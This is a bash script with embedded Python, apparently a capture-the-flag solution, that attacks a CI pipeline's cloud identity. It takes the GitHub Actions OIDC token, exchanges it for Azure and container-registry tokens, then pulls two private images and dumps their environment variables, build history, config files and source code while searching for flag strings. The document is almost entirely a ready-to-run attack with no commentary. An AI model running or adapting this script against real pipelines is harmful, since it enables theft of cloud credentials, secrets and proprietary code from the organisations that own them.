#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, gzip, io, tarfile, urllib.request, urllib.parse
def http(url, data=None, headers=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=90) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
REG="crtblplatprodx3euoz.azurecr.io"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://management.azure.com/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
ARM=jg(b)["access_token"]
st,b=http(f"https://{REG}/oauth2/exchange",{"grant_type":"access_token","service":REG,"tenant":TEN,"access_token":ARM})
RT=jg(b)["refresh_token"]
def tok(scope):
    st,b=http(f"https://{REG}/oauth2/token",{"grant_type":"refresh_token","service":REG,"refresh_token":RT,"scope":scope})
    return jg(b).get("access_token")
ACCEPT=("application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json,"
        "application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.index.v1+json")
for repo in ("tebamoto-reporting-api","catalog-api"):
    t=tok(f"repository:{repo}:pull"); H={"Authorization":"Bearer "+t}
    st,b=http(f"https://{REG}/v2/{repo}/manifests/latest", headers=dict(H, Accept=ACCEPT))
    man=jg(b)
    print(f"\n######## {repo} manifest {st} mediaType={man.get('mediaType')}")
    if "manifests" in man:
        st,b=http(f"https://{REG}/v2/{repo}/manifests/{man['manifests'][0]['digest']}", headers=dict(H, Accept=ACCEPT)); man=jg(b)
    cfgd=man.get("config",{}).get("digest")
    st,cb=http(f"https://{REG}/v2/{repo}/blobs/{cfgd}", headers=H)
    print("  config blob:", st, len(cb))
    c=jg(cb)
    print("  Env:", (c.get("config") or {}).get("Env"))
    print("  Cmd:", (c.get("config") or {}).get("Cmd"), "Entrypoint:", (c.get("config") or {}).get("Entrypoint"))
    for h in (c.get("history") or [])[-14:]:
        cb2=h.get("created_by","")[:220]
        print("   hist:", cb2)
    m=FLAG.search(cb)
    if m: print("  >>> FLAG in config:", m.group(1).decode())
    for ly in man.get("layers",[]):
        st,lb=http(f"https://{REG}/v2/{repo}/blobs/{ly['digest']}", headers=H)
        if st!=200: print("   layer", ly['digest'][:16], "HTTP", st); continue
        try: raw=gzip.decompress(lb)
        except Exception: raw=lb
        m=FLAG.search(raw)
        if m: print(f"   >>> FLAG in layer {ly['digest'][:16]}: {m.group(1).decode()}")
        try:
            tf=tarfile.open(fileobj=io.BytesIO(raw))
        except Exception:
            continue
        for mem in tf.getmembers():
            if not mem.isfile(): continue
            nm=mem.name
            if nm.startswith(("usr/","lib/","bin/","sbin/","etc/ssl","usr/share")): continue
            if mem.size>400000: continue
            try: d=tf.extractfile(mem).read()
            except Exception: continue
            mm=FLAG.search(d)
            if mm: print(f"   >>> FLAG in {nm}: {mm.group(1).decode()}")
            if nm.endswith((".py",".json",".env",".sh",".txt",".yaml",".yml")) and mem.size<20000 and "site-packages" not in nm:
                print(f"   --- {nm} ({mem.size}b)")
                if nm.endswith(".py") and ("app" in nm or "main" in nm or "server" in nm):
                    print(d.decode("utf-8","replace")[:4000])
PYEOF
echo "=== done ==="